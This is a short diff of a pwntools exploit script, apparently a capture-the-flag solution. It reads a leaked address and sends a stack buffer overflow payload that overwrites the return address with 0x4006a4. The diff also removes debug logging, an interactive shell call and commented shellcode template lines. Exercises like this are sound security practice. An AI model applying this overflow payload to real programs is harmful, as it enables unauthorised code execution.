@@ -38,7 +38,6 @@ continue
 # NX:       NX enabled
 # PIE:      No PIE (0x400000)
 
-context.log_level = 'DEBUG'
 
 io = start()
 io.recvline()
@@ -46,16 +45,5 @@ easy = io.recvline().decode()
 easy = easy[6:-1]
 easy = int(easy, 16)
 io.recvuntil(b">")
-print(p32(easy))
-io.send(b"A"*64 + p64(0) + p64(0x4006a4) + p64(easy))
-
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)\
-
-io.interactive()
+io.sendline(b"A"*64 + p64(0) + p64(0x4006a4) + p64(easy))
+print(io.recv(15))
